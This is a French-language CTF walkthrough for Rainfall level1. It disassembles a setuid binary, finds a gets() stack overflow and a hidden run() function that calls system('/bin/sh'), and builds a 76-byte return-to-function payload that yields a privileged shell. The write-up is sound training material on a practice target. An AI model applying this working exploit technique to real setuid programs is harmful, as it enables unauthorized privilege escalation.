# Walkthrough — Rainfall : Level1

## 1. Reconnaissance

### Permissions du binaire

```
-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
```

### Comportement à l'exécution

```bash
$ ./level1
AAA            ← on tape quelque chose
$              ← le programme se termine sans rien afficher
```

Pas d'invite, pas de message. Le programme attend silencieusement une entrée puis se termine.

**Mot magique : `gets`**. C'est LA fonction la plus dangereuse de la libc : elle lit `stdin` jusqu'à `\n` **sans aucune limite de taille**. Vulnérabilité de buffer overflow quasi garantie.

---

## 2. Analyse statique avec gdb

### Désassemblage de `main`

```asm
0x08048480 <+0>:   push   %ebp
0x08048481 <+1>:   mov    %esp,%ebp
0x08048483 <+3>:   and    $0xfffffff0,%esp
0x08048486 <+6>:   sub    $0x50,%esp          ← réserve 80 octets sur la pile
0x08048489 <+9>:   lea    0x10(%esp),%eax
0x0804848d <+13>:  mov    %eax,(%esp)
0x08048490 <+16>:  call   0x8048340 <gets@plt>
0x08048495 <+21>:  leave
0x08048496 <+22>:  ret
```

Traduction en C :

```c
int main(void) {
    char buffer[64];  // 0x50 - 0x10 = 64 bytes (taille réelle du buffer)
    gets(buffer);
    return 0;
}
```

```asm
(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048444  run <- fonction cachée !>
0x08048480  main
```

### La fonction cachée `run` qui n'est pas utilisée dans `main`


```asm
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave  
   0x0804847f <+59>:    ret    
End of assembler dump.
```

Et :

```
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

 **Découverte clé** : il existe une fonction `run()` à l'adresse `0x08048444` qui appelle directement `system("/bin/sh")`. **Plus besoin de chercher `system` dans la libc.**

---

## 3. Le plan d'attaque

### Disposition de la pile pendant `main`

```
Adresses hautes
┌──────────────────────────┐
│ Adresse de retour (4 oct)│  ← cible : on l'écrase avec &run
├──────────────────────────┤
│ Saved EBP     (4 oct)    │  ← à écraser aussi (junk)
├──────────────────────────┤
│ Padding alignement(8 oct)│  ← ajouté par and $0xfffffff0,%esp
├──────────────────────────┤
│ Buffer        (64 oct)   │  ← gets écrit ici
└──────────────────────────┘
Adresses basses (esp)
```

Total padding avant l'adresse de retour : 64 + 8 + 4 = **76 octets** (vérifié expérimentalement).

### Schéma du payload

```
[ XX octets de remplissage ][ adresse de run (4 octets) ]
                              0x08048444 → \x44\x84\x04\x08
```

Note le **little-endian** : l'adresse `0x08048444` s'écrit en mémoire à l'envers, octet faible en premier.

## 4. L'exploit

### Génération du payload

```bash
python -c 'print "B"*76 + "\x44\x84\x04\x08"' > /tmp/payload
```

- `B` × 76 → padding qui remplit le buffer + comble jusqu'à l'adresse de retour
- `\x44\x84\x04\x08` → adresse de `run()` en little-endian

### Lancement

```bash
cat /tmp/payload - | ./level1
```
---

## 5. Récapitulatif des techniques

| Concept | Application ici |
|---|---|
| **Buffer overflow** | `gets()` permet d'écrire au-delà du buffer |
| **Écrasement de l'adresse de retour** | On contrôle où `ret` saute |
| **Return-to-function** | On saute vers une fonction existante du binaire (`run`) |
| **Little-endian** | Les adresses x86 sont stockées octet faible en premier |
| **Setuid exploitation** | Le shell hérite des droits du propriétaire du binaire |

---